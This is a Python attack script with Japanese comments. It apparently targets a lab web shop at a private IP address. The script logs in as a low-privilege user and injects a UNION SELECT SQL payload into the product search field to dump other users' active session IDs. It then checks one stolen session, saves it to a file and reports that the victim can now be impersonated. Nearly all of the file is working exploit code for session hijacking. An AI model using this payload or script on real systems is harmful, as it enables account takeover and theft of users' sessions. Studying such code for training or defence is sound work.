#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import sys

def login_and_get_session(username, password, base_url):
    """
    ユーザーでログインしてセッションIDを取得する
    """
    login_url = f"{base_url}/login.cgi"
    
    # ログインデータ
    login_data = {
        'action': 'login',
        'username': username,
        'password': password
    }
    
    session = requests.Session()
    
    try:
        # ログインリクエストを送信
        response = session.post(login_url, data=login_data)
        
        print(f"[*] Login Status Code: {response.status_code}")
        
        if response.status_code == 200:
            if "Login successful" in response.text:
                print(f"[+] Login successful for user: {username}")
                
                # Cookieからセッション情報を取得
                cookies = session.cookies
                user_id_cookie = cookies.get('user_id')
                session_id_cookie = cookies.get('session_id')
                
                if user_id_cookie and session_id_cookie:
                    session_info = f"{user_id_cookie},{session_id_cookie}"
                    print(f"[+] Session ID obtained: {session_info}")
                    return session_info
                else:
                    print(f"[!] Could not extract session cookies")
                    print(f"[*] Available cookies: {dict(cookies)}")
                    return None
            else:
                print(f"[!] Login failed")
                print(f"[*] Response: {response.text[:500]}")
                return None
        else:
            print(f"[!] HTTP Error: {response.status_code}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None

def check_products_page(session_info, base_url):
    """
    商品ページにアクセスしてセッション状態を確認
    """
    products_url = f"{base_url}/products.cgi"
    
    user_id, session_token = session_info.split(',', 1)
    
    headers = {
        'Cookie': f'user_id={user_id}; session_id={session_token}',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    try:
        response = requests.get(products_url, headers=headers)
        
        print(f"[*] Products page status: {response.status_code}")
        
        if response.status_code == 200:
            if "Terminal X - Products" in response.text:
                print(f"[+] Successfully accessed products page")
                print(f"[+] Session is valid and active")
                
                # セッション情報をページから抽出（デバッグ目的）
                if "Current user:" in response.text:
                    user_match = re.search(r'Current user:\s*(\w+)', response.text)
                    if user_match:
                        current_user = user_match.group(1)
                        print(f"[+] Current logged in user: {current_user}")
                
                return True
            else:
                print(f"[!] Unexpected response from products page")
                return False
        else:
            print(f"[!] Failed to access products page: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

def extract_sessions_via_injection(base_url, user_id, session_token):
    """
    SQLインジェクションを使用して他のユーザーのセッション情報を取得する
    """
    products_url = f"{base_url}/products.cgi"
    
    # UNION SELECT クエリを使ってsessionsテーブルから情報を抽出
    # products テーブルの構造: id, name, seller, price, image_url, description
    # sessions テーブルの構造: session_id, user_id, created_at, expires_at
    injection_payload = "' UNION SELECT 1 as id, CONCAT(user_id,',',session_id) as name, 'hijacked' as seller, 0 as price, 'none' as image_url, 'session' as description FROM sessions WHERE user_id != 'user2' AND expires_at > NOW() -- "
    
    headers = {
        'Cookie': f'user_id={user_id}; session_id={session_token}',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    data = {
        'search_query': injection_payload
    }
    
    try:
        response = requests.post(products_url, headers=headers, data=data)
        
        print(f"[*] SQLi Status Code: {response.status_code}")
        
        if response.status_code == 200:
            print(f"[+] SQL Injection executed")
            
            # レスポンスからセッション情報を抽出
            sessions = []
            import re
            
            # "hijacked" という seller を持つ商品を探す（これがインジェクションされたデータ）
            # HTMLから商品名を抽出（user_id,session_id の形式になっている）
            name_pattern = r'<h3[^>]*>([^<,]+,[a-f0-9]{32})</h3>'
            matches = re.findall(name_pattern, response.text)
            
            if matches:
                print(f"[+] Found sessions via SQL injection:")
                for session_info in matches:
                    user, session = session_info.split(',', 1)
                    print(f"[+] Hijacked session for {user}: {session_info}")
                    sessions.append(session_info)
                
                return sessions
            else:
                # フォールバック: より広範囲な検索
                print(f"[*] Primary pattern not found, trying alternative extraction...")
                
                # HTMLから user_id,session_id パターンを直接探す
                session_pattern = r'([a-zA-Z0-9_]+),([a-f0-9]{32})'
                all_matches = re.findall(session_pattern, response.text)
                
                for user, session in all_matches:
                    if user != 'user2':  # 自分以外のセッション
                        session_info = f"{user},{session}"
                        if session_info not in sessions:
                            print(f"[+] Found session for {user}: {session_info}")
                            sessions.append(session_info)
                
                if sessions:
                    return sessions
                else:
                    print(f"[!] No sessions found in response")
                    # デバッグ用：レスポンスの一部を表示
                    print(f"[*] Response preview (first 500 chars):")
                    print(response.text[:500])
                    print(f"[*] Response preview (looking for 'hijacked'):")
                    if 'hijacked' in response.text:
                        start = response.text.find('hijacked') - 100
                        end = response.text.find('hijacked') + 200
                        print(response.text[max(0, start):end])
                    return []
        else:
            print(f"[!] SQL injection failed: {response.status_code}")
            return []
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return []

def main():
    base_url = "http://192.168.49.128/hack/public"
    attacker_username = "user2"
    attacker_password = "password"
    
    print(f"[*] Starting session hijacking via SQL injection")
    print(f"[*] Attacker: {attacker_username}:{attacker_password}")
    print(f"[*] Base URL: {base_url}")
    print(f"[*] " + "="*50)
    
    # Step 1: user2でログインしてセッションIDを取得
    print(f"[*] Step 1: Logging in as {attacker_username}")
    attacker_session = login_and_get_session(attacker_username, attacker_password, base_url)
    
    if not attacker_session:
        print(f"[!] Failed to login as {attacker_username}. Exiting.")
        return
    
    # Step 2: SQLインジェクションで他のユーザーのセッション情報を取得
    print(f"[*] Step 2: Extracting other users' sessions via SQL injection")
    user_id, session_token = attacker_session.split(',', 1)
    hijacked_sessions = extract_sessions_via_injection(base_url, user_id, session_token)
    
    if hijacked_sessions:
        print(f"[+] Successfully hijacked {len(hijacked_sessions)} sessions")
        
        # 最初に見つかったセッションを保存
        session_info = hijacked_sessions[0]
        target_user = session_info.split(',')[0]
        
        # Step 3: ハイジャックしたセッションで商品ページにアクセスして確認
        print(f"[*] Step 3: Verifying hijacked session for user {target_user}")
        if check_products_page(session_info, base_url):
            print(f"[+] Session hijacking successful!")
            
            # セッション情報をファイルに保存
            with open('hijacked_session.txt', 'w') as f:
                f.write(session_info)
            print(f"[+] Session saved to hijacked_session.txt")
            
            print(f"[*] " + "="*50)
            print(f"[+] Session hijacking complete!")
            print(f"[+] Hijacked session: {session_info}")
            print(f"[*] You can now use this session to impersonate {target_user}")
            
            # 全ての発見されたセッション情報を表示
            print(f"[*] All discovered sessions:")
            for i, sess in enumerate(hijacked_sessions, 1):
                print(f"[*] Session {i}: {sess}")
        else:
            print(f"[!] Session verification failed for {target_user}")
    else:
        print(f"[!] No sessions found via SQL injection")

if __name__ == "__main__":
    main()
